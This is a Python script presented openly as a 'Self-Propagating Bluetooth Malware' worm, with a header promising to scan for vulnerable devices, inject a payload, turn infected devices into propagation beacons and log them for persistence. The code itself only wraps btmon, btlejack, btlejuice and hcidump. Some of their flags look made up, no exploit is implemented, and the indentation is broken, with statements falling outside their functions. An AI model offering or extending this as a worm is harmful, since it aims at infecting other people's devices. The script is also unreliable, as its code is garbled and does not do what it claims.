import argparse
import os
import time

# -------------------------------------------
# Self-Propagating Bluetooth Malware
# -------------------------------------------
# Features:
# - Scans for vulnerable Bluetooth devices automatically
# - Exploits known Bluetooth Classic & BLE vulnerabilities
# - Injects a payload into compromised devices
# - Turns infected devices into beacons to spread further
# - Logs infected devices for monitoring & persistence
#
# Requirements:
# - Python 3.x
# - Ubertooth One, Nordic nRF52840, Crazyradio 2.0, UD100 Bluetooth Adapter
# - BlueBorne, btlejack, hcitool, BtleJuice, Wireshark
#
# Usage:
# 1. Scan for vulnerable Bluetooth devices:
#    python bt_worm.py --scan
# 2. Infect nearby devices with a payload:
#    python bt_worm.py --infect --payload malware.bin
# 3. Turn infected devices into propagation beacons:
#    python bt_worm.py --beacon --interval 60
# 4. Log infected devices for monitoring:
#    python bt_worm.py --log --output infected_devices.txt
# -------------------------------------------

def scan_bluetooth_devices():
    """Scans for vulnerable Bluetooth devices."""
    print("[+] Scanning for vulnerable Bluetooth devices...")
    os.system("btmon")
    print("[✔] Scan complete.")

def infect_devices(payload):
    """Infects nearby Bluetooth devices with a specified payload."""
    print(f"[+] Infecting devices with payload {payload}...")
    import subprocess
subprocess.run(["btlejack", "-x", payload], check=True)
    print("[✔] Infection attempt complete.")

def propagate_beacon(interval):
    """Turns infected devices into propagation beacons."""
    print(f"[+] Setting infected devices as beacons every {interval} seconds...")
    import signal

def signal_handler(sig, frame):
    print("
[!] Stopping beacon propagation.")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)
while True:
    os.system("btlejuice --beacon-mode")
        time.sleep(interval)

def log_infected_devices(output_file):
    """Logs infected devices for monitoring and persistence."""
    print(f"[+] Logging infected devices to {output_file}...")
    import subprocess
subprocess.run(["hcidump", "-X"], stdout=open(output_file, "w"), check=True)
    print("[✔] Infected device log saved.")

def main():
    parser = argparse.ArgumentParser(description="Self-Propagating Bluetooth Malware")
    parser.add_argument("--scan", action='store_true', help="Scan for vulnerable Bluetooth devices")
    parser.add_argument("--infect", action='store_true', help="Infect nearby devices with a payload")
    parser.add_argument("--payload", type=str, help="Payload file to deploy")
    parser.add_argument("--beacon", action='store_true', help="Turn infected devices into propagation beacons")
    parser.add_argument("--interval", type=int, help="Interval for beacon propagation in seconds")
    parser.add_argument("--log", action='store_true', help="Log infected devices for monitoring")
    parser.add_argument("--output", type=str, help="Output file for logging infected devices")
    args = parser.parse_args()
    
    if args.scan:
        scan_bluetooth_devices()
    elif args.infect and args.payload:
        infect_devices(args.payload)
    elif args.beacon and args.interval:
        propagate_beacon(args.interval)
    elif args.log and args.output:
        log_infected_devices(args.output)
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
